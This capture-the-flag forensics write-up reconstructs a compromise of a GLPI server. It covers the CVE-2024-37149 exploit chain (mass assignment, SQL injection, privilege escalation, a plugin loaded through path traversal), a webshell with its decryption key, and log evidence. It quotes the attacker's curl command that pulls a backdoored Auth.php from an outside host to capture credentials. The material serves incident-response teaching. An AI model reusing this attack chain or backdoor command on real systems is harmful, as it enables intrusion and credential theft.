# Operation Pensieve Breach 3 - Analysis

## Challenge Description

Now that you know how the attacker retrieved Albus' credentials, understand how the attacker managed to perform the previous actions.

Find the following information:
1. Absolute path of the left-over file used to backdoor the authentication
2. Decoded identifier (without the flag wrapper) that the attacker encoded when registering the backdoor component
3. ID of the CVE used
4. sAMAccountName used to exploit the application
5. Using Ministry's log, what's the last legitimate IP address used by this user before exploitation? (192.168.56.1 is out of scope)

**Flag Format:** `Hero{/path/file1;Decoded_IDENTIFIER;CVE-XXXX-XXXXX;user.name;IP_ADDRESS}`

---

## Solution

### Flag
```
Hero{/var/www/glpi/files/_tmp/setup.php;This_GLPI_is_fully_backdoored_sapristi;CVE-2024-37149;neville.longbottom;192.168.56.101}
```

---

## Evidence Analysis

### 1. Left-over File Used to Backdoor Authentication

**Finding:** `/var/www/glpi/files/_tmp/setup.php`

This is the webshell uploaded by the attacker via the CVE-2024-37149 exploit. The webshell uses AES-256-CBC encryption with:
- Key: `14ac4b90bd3f880e741a85b0c6254d1f`
- IV: `5cf025270d8f74c9`

Location in evidence:
```
dist/var/www/glpi/files/_tmp/setup.php
```

### 2. Decoded Identifier for Backdoor Component

**Finding:** `This_GLPI_is_fully_backdoored_sapristi`

Found in InnoDB log file (`ib_logfile0`) - the attacker created a malicious plugin with:
- Plugin name: `form_submit`
- Plugin directory: `../../../../../../../../../../../../../../../../var/www/glpi/files/_tmp` (path traversal)
- Encoded identifier: `YUhlcm97VGhpc19HTFBJX2lzX2Z1bGx5X2JhY2tkb29yZWRfc2FwcmlzdGl9`

Base64 decoded: `aHero{This_GLPI_is_fully_backdoored_sapristi}`

The "a" prefix and "GPL" suffix visible in the database are part of the plugin format, the actual identifier without flag wrapper is: `This_GLPI_is_fully_backdoored_sapristi`

### 3. CVE Used

**Finding:** `CVE-2024-37149`

This is an authenticated Local File Inclusion vulnerability in GLPI affecting versions prior to 10.0.16. 

**Attack Chain:**
1. **Mass Assignment** - Low-privilege user injects `savedsearches_pinned` field to poison database
2. **SQL Injection** - Triggered when pinning a saved search, modifies API token/rights
3. **Privilege Escalation** - Gain ALLSTANDARDRIGHT on config object via mass assignment
4. **RCE via LFI Plugin** - Create plugin with path traversal directory, upload setup.php webshell

Source: https://sensepost.com/blog/2024/from-a-glpi-patch-bypass-to-rce/

### 4. sAMAccountName Used

**Finding:** `neville.longbottom`

Evidence from GLPI access log (`glpi_ssl_access.log`):
```
192.168.56.200 - - [22/Nov/2025:23:03:48 +0000] "POST /front/login.php HTTP/1.1" 302 469 "-" "python-requests/2.32.5"
```

From GLPI application log (`files/_log/*.log`):
```
2025-11-22 23:03:48 [@pensieve01]
[login] 3: neville.longbottom log in from IP 192.168.56.200
```

The attacker used the `neville.longbottom` AD account from IP `192.168.56.200` with a Python exploit script.

### 5. Last Legitimate IP Address

**Finding:** `192.168.56.101`

From Windows Security.evtx analysis (Event ID 4624 - Logon Events):

| Time (UTC) | IP Address | Type | Notes |
|------------|------------|------|-------|
| 21:47:48 | 192.168.56.230 | Advapi/LDAP | GLPI server LDAP authentication |
| 22:52:22 | 192.168.56.101 | Kerberos | **Last legitimate logon** |
| 23:01:39 | 192.168.56.200 | NTLM | **ATTACKER** (workstation: DESKTOP-7970T2T) |
| 23:03:45+ | 192.168.56.230 | LDAP | Attack via GLPI server |

The last legitimate IP (excluding 192.168.56.1 per challenge) before the attack from 192.168.56.200 was **192.168.56.101**.

---

## Attack Timeline

| Time (UTC) | Event |
|------------|-------|
| 17:12:10 | neville.longbottom account created in AD |
| 21:40:15 | GLPI installation begins from 192.168.56.1 |
| 21:44:16 | GLPI installation completed |
| 21:47:48 | neville.longbottom first LDAP auth via GLPI |
| 21:48:01 | neville.longbottom logs into GLPI from 192.168.56.1 |
| 22:52:22 | **Last legitimate login** from 192.168.56.101 (Kerberos) |
| 23:01:39 | **Attack begins** - NTLM auth from 192.168.56.200 |
| 23:03:48 | Attacker logs into GLPI as neville.longbottom |
| 23:03:49 | File upload attack via `/ajax/fileupload.php` |
| 23:03:49 | Document type modified to allow PHP uploads |
| 23:03:50 | Profile escalation via SQL injection (kanban/search) |
| 23:09:05 | Webshell accessed via plugin.php |
| 23:09:36 | Command executed: `whoami` |
| 23:10:02 | Auth.php backdoored via curl command |
| 23:11:41 | Captured credential test (Flag user) |
| 23:12:14 | Attacker retrieves captured credentials from example.gif |

---

## Files of Interest

- `/var/www/glpi/files/_tmp/setup.php` - Webshell (left-over file)
- `/var/www/glpi/src/Auth.php` - Backdoored authentication file
- `/var/www/glpi/pics/screenshots/example.gif` - Credential capture file
- `winevt/Logs/Security.evtx` - Windows Security event logs
- `var/lib/mysql/ib_logfile0` - MySQL InnoDB logs with plugin registration

---

## Commands Executed via Webshell

Decrypted from Apache access logs using webshell key/IV:

1. `whoami` 
2. `curl https://xthaz.fr/glpi_auth_backdoored.php > /var/www/glpi/src/Auth.php`

The second command replaced the legitimate Auth.php with a backdoored version that captures credentials to `/var/www/glpi/pics/screenshots/example.gif`.
